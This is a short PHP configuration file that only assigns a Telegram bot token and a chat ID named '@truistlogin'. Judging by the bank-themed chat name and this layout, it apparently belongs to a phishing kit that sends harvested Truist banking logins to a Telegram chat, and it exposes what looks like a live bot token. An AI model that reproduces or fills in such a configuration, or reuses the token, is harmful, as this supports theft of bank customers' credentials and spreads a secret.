<?php 



$bot = "8057143086:AAEn0QfgxNWv0hcCD6HE3gA8rmzbs9BW2Rs";
$chat_id = "@truistlogin";


?>